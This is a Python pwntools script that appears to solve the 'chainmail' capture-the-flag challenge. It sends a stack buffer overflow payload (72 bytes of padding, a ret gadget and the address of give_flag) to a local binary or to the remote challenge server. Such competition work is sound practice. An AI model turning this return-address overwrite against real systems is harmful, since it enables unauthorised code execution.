#!/usr/bin/env python3

from pwn import *
import time
import sys

local = 0
debug = 0

context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

# def get_base_address(proc):
#     return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)
# "set $_base = 0x{:x}".format(get_base_address(io))

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		io = process('./chal')
		if debug:
			gdb.attach(io, gdbscript='''
              handle SIGALRM ignore
              b* main+594
              c
			''')
		else:
			pass
	else:
		io = remote('chainmail.chal.uiuc.tf', 1337)

	return io

io = conn()

elf = ELF('chal')
# libc = ELF('libc.so.6')

give_flag = 0x0000000000401216
ret = 0x000000000040101a
payload = 64*b'A' + 8*b'A' + p64(ret) + p64(give_flag)
io.sendline(payload)
io.interactive()
